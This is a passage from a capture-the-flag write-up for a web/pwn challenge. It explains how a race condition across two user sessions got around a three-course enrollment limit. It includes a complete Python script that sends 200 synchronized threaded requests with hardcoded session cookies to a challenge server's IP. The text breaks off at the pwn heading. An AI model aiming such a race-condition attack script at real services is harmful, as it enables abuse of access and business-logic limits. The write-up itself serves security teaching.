# 0xBAD Minton (web/pwn, 14 solved, 740p)

## Web part

First part of the task is on the Web side.
We get access to some webpage where we can register, and sign-up for 0-3 "courses".
There is really nothing more, no SQLi in forms or anything else.

In the root of the page we get access to some interesting files:

- [backend server binary](backend_server)
- Todo note `Quickly complete netcat client version on 178.128.84.72:9997`

We can connect via netcat to given endpoint, and the binary we just found is actually listening there for connections.
Once we reverse engineer the binary a bit, we come to the conclusion, that we could exploit it, if we manage to sign-up for more than 3 courses.
This has to be done on the web side.

We thought that maybe a simple race condition will work, but it didn't.
Then we tried to do race condition, with multiple sessions, and it worked just fine.

We create 2 different user session on the webpage.
Then we try to add courses from both of them at the same time:

```python
import threading
import requests
from queue import Queue

max = 100
threads = Queue()
init_barrier = threading.Barrier(max * 2)


def enroll(cookie):
    threads.get()
    init_barrier.wait()
    url = "http://178.128.84.72/login.php?action=enroll"
    print(requests.get(url, cookies={"PHPSESSID": cookie}).text)
    threads.task_done()


def worker2(index):
    enroll("33hoabtfv6t8amoovlrjecqun5")


def worker(index):
    enroll("qq5kqe8lbeim1md44m2bnuajr4")


def main():
    for i in range(max):
        thread = threading.Thread(target=worker, args=[i])
        thread.daemon = True
        thread.start()
    for i in range(max):
        thread = threading.Thread(target=worker2, args=[i])
        thread.daemon = True
        thread.start()
    for i in range(max * 2):
        threads.put(i)
    threads.join()


main()
```

We go with 2 sessions, and 100 threads each.
After we run this, we get user with 6 courses, which is enough to exploit the binary.

## Pwn part
